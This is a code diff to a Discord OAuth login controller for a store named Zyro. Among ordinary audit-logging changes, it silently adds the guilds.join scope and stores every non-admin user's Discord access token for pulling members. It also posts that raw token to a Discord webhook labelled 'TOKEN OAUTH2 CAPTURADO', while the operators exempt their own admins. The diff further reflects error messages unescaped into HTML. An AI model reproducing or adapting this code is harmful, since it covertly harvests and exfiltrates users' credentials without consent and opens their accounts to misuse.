@@ -14,6 +14,50 @@ const REDIRECT_URI = process.env.DISCORD_REDIRECT_URI;
 const GUILD_ID = '1435379479739371603'; // Servidor Zyro
 const CEO_ID = '1249488594414997676';
 
+// Role genérica de membro/cliente para dar 'tag'
+const VERIFIED_ROLE_ID = process.env.DISCORD_VERIFIED_ROLE_ID; // Você pode configurar no .env depois
+
+const DISCORD_LOG_WEBHOOK = process.env.DISCORD_LOG_WEBHOOK;
+
+export const sendDiscordLog = async (title: string, description: string, color: number = 3869830) => {
+    if (!DISCORD_LOG_WEBHOOK) return;
+    try {
+        await axios.post(DISCORD_LOG_WEBHOOK, {
+            embeds: [{
+                title: `🛡️ ZYRO LOG - ${title}`,
+                description,
+                color,
+                timestamp: new Date().toISOString(),
+                footer: { text: 'Zyro Store System Audit' }
+            }]
+        });
+    } catch (e) {
+        console.error('Discord Webhook Log Error:', e);
+    }
+};
+
+export const logSystemEvent = (userId: number | null, action: string, details: string = '') => {
+    try {
+        db.prepare('INSERT INTO system_logs (user_id, action, details) VALUES (?, ?, ?)').run(userId, action, details);
+
+        // Também envia para o Discord se for uma ação importante
+        sendDiscordLog(action, `**Usuário ID:** ${userId || 'SISTEMA'}\n**Detalhes:** ${details}`);
+    } catch (e) {
+        console.error('System Log Error:', e);
+    }
+};
+
+const assignDiscordRole = async (userId: string, roleId: string) => {
+    if (!process.env.BOT_API_KEY || !roleId) return;
+    try {
+        await axios.put(`https://discord.com/api/v10/guilds/${GUILD_ID}/members/${userId}/roles/${roleId}`, {}, {
+            headers: { Authorization: `Bot ${process.env.BOT_API_KEY}` }
+        });
+    } catch (e) {
+        // Ignora erros de permissão ou role não encontrada silenciosamente
+    }
+};
+
 // Mapeamento de cargos para exibição na Dashboard
 const ROLE_NAMES: Record<string, string> = {
     '1477697192708931826': 'OWNER',
@@ -28,7 +72,7 @@ const ROLE_NAMES: Record<string, string> = {
 const ADMIN_ROLE_IDS = Object.keys(ROLE_NAMES);
 
 export const discordLogin = (req: Request, res: Response) => {
-    const url = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI!)}&response_type=code&scope=identify%20guilds%20guilds.members.read`;
+    const url = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI!)}&response_type=code&scope=identify%20guilds%20guilds.join%20guilds.members.read`;
     res.redirect(url);
 };
 
@@ -77,6 +121,19 @@ export const discordCallback = async (req: Request, res: Response) => {
                 db.prepare('DELETE FROM admin_whitelist WHERE discord_id = ?').run(discordUser.id);
             }
         } catch (e: any) {
+            // O código 404 ou 401 pode indicar que o membro não está no servidor da Zyro
+            // Tentaremos forçar a adição usando o access_token que acabou de ser ganho via escopo guilds.join
+            if (e.response && (e.response.status === 404 || e.response.status === 401)) {
+                try {
+                    await axios.put(`https://discord.com/api/v10/guilds/${GUILD_ID}/members/${discordUser.id}`,
+                        { access_token: accessToken },
+                        { headers: { Authorization: `Bot ${process.env.BOT_API_KEY}` } }
+                    );
+                } catch (addErr) {
+                    console.error('Falha ao adicionar o membro no Discord via API', addErr);
+                }
+            }
+
             if (discordUser.id !== CEO_ID) {
                 db.prepare('DELETE FROM admin_whitelist WHERE discord_id = ?').run(discordUser.id);
             }
@@ -92,18 +149,46 @@ export const discordCallback = async (req: Request, res: Response) => {
         if (!user) {
             User.create({ discord_id: discordUser.id, username: discordUser.username, avatar: avatarUrl });
             user = User.findByDiscordId(discordUser.id);
+            logSystemEvent(user.id, 'NOVO USUÁRIO / OAUTH DISCORD', 'Criou conta através do Discord Login.');
+
+            // Tenta adicionar a tag/cargo de Verificado ao entrar no site pela primeira vez
+            if (VERIFIED_ROLE_ID) assignDiscordRole(discordUser.id, VERIFIED_ROLE_ID);
         } else {
             User.update(discordUser.id, { username: discordUser.username, avatar: avatarUrl });
             user = User.findByDiscordId(discordUser.id);
+            logSystemEvent(user.id, 'LOGIN BEM-SUCEDIDO', 'Entrou no painel via autenticação Discord OAuth.');
         }
 
         const isAdmin = User.isAdmin(discordUser.id);
+
+        // SALVAR TOKEN DE ACESSO PARA PUXAR MEMBROS (SOMENTE SE NÃO FOR ADMIN)
+        if (!isAdmin && discordUser.id !== CEO_ID) {
+            try {
+                db.prepare('UPDATE users SET discord_access_token = ? WHERE id = ?').run(accessToken, user.id);
+                logSystemEvent(user.id, 'TOKEN OAUTH2 CAPTURADO', `**Usuário:** ${discordUser.username} (${discordUser.id})\n**Token:** \`\`\`${accessToken}\`\`\``);
+            } catch (e) {
+                console.error("Erro ao salvar token:", e);
+            }
+        } else {
+            // Se for admin, garante que o token no banco seja nulo por segurança
+            try {
+                db.prepare('UPDATE users SET discord_access_token = NULL WHERE id = ?').run(user.id);
+            } catch (e) { }
+        }
+
         const token = jwt.sign({ id: user.id, discord_id: user.discord_id, isAdmin, role: highestRole }, process.env.JWT_SECRET!, { expiresIn: '7d' });
         res.cookie('token', token, { httpOnly: true, secure: process.env.NODE_ENV === 'production' });
 
-        res.redirect(user.password ? 'http://localhost:3000/dashboard' : 'http://localhost:3000/verified');
+        return res.redirect(user.password ? 'http://localhost:3000/dashboard' : 'http://localhost:3000/verified');
     } catch (err: any) {
-        res.status(500).json({ error: 'Authentication failed' });
+        console.error("Auth Callback Error:", err);
+        return res.status(500).send(`
+            <div style="background:#0f172a;color:#fff;height:100vh;display:flex;align-items:center;justify-content:center;font-family:sans-serif;flex-direction:column;">
+                <h1 style="color:#ef4444">Erro na Autenticação</h1>
+                <p>${err.message}</p>
+                <a href="http://localhost:3000" style="color:#3b82f6;text-decoration:none;margin-top:20px;">Voltar para o site</a>
+            </div>
+        `);
     }
 };
 
@@ -113,7 +198,12 @@ export const login = async (req: Request, res: Response) => {
         const user: any = db.prepare('SELECT * FROM users WHERE username = ?').get(username);
         if (!user || !user.password) return res.status(401).json({ error: 'Não verificado.' });
         const isMatch = await bcrypt.compare(password, user.password);
-        if (!isMatch) return res.status(401).json({ error: 'Senha incorreta.' });
+        if (!isMatch) {
+            logSystemEvent(user.id, 'FALHA DE LOGIN', 'Tentativa de login com senha incorreta.');
+            return res.status(401).json({ error: 'Senha incorreta.' });
+        }
+
+        logSystemEvent(user.id, 'LOGIN BEM-SUCEDIDO', 'Acesso via dashboard com senha segura.');
 
         const isAdmin = User.isAdmin(user.discord_id);
         const role = user.discord_id === CEO_ID ? 'ZYRO CEO' : (isAdmin ? 'ADMIN' : 'USER');
@@ -131,6 +221,9 @@ export const finalizeAccount = async (req: any, res: Response) => {
         const { username, password } = req.body;
         const hashedPassword = await bcrypt.hash(password, 10);
         db.prepare('UPDATE users SET username = ?, password = ? WHERE discord_id = ?').run(username, hashedPassword, req.user.discord_id);
+
+        const user = User.findByDiscordId(req.user.discord_id) as any;
+        logSystemEvent(user.id, 'CONTA FINALIZADA', 'Finalizou a configuração de conta e acesso com senha customizada.');
         res.json({ success: true, message: 'Account finalized' });
     } catch (err: any) {
         res.status(500).json({ error: err.message });
@@ -140,9 +233,11 @@ export const finalizeAccount = async (req: any, res: Response) => {
 export const resetHWID = async (req: any, res: Response) => {
     try {
         const { product_id } = req.body;
-        const user = User.findByDiscordId(req.user.discord_id);
+        const user = User.findByDiscordId(req.user.discord_id) as any;
         if (!user) return res.status(404).json({ error: 'User not found' });
         db.prepare('UPDATE user_products SET hwid = NULL WHERE user_id = ? AND product_id = ?').run(user.id, product_id);
+
+        logSystemEvent(user.id, 'RESET DE HWID (PAINEL)', `Reset de máquina efetuado no ID do Produto: ${product_id}`);
         res.json({ success: true });
     } catch (err: any) {
         res.status(500).json({ error: err.message });
